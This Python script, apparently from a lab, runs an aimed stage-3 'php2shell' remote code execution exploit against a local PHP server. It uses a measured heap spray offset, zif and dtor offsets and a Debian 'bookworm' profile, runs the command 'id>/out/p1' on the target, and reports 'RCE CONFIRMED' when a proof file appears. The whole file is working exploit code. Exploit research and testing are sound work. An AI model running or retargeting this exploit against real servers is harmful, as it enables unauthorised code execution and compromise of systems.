#!/usr/bin/env python3
"""Aimed stage-3 shot on the forensics container: HTDATA = chunk + 0x6a0d8
(the spray address measured under gdb). Independent confirmation run."""
from __future__ import annotations

import json
import os
import re
import sys

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402

STATE = "/tmp/p2s-fs-8335.json"
HTDATA_OFF = 0x6A0D8

with open(STATE, encoding="utf-8") as fh:
    s = json.load(fh)

mod = C.load_upstream(VENDOR)
t = mod.Target(f"http://127.0.0.1:{s['port']}/index.php", verbose=False)
ex = mod.Exploit(t, "id>/out/p1", zif_offset=s["zif"],
                 dtor_offset=s["dtor"], profile="bookworm", verbose=False)

os.environ["P2S_CARRIER_LEN"] = "15"
ex.stage3_carrier = True
ex.stage3_pads = [(31, 31)] * 6

if os.path.exists(s["proof"]):
    os.unlink(s["proof"])
try:
    ex.rotate()
    ex.stage3(s["chunk"] + HTDATA_OFF, s["lib"] + s["zif"])
    raw = getattr(ex, "last3", b"") or b""
    head = raw.partition(b"\r\n\r\n")[0]
    m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    print(f"[*] response: {m.group(1).decode() if m else '?'} / {len(raw)} bytes")
except Exception as exc:
    print(f"[!] exception: {type(exc).__name__}: {exc}")

ok = os.path.exists(s["proof"]) and os.path.getsize(s["proof"]) > 0
if ok:
    out = open(s["proof"]).read().strip()
    print(f"[+] RCE CONFIRMED: {out}")
else:
    print("[-] no proof")
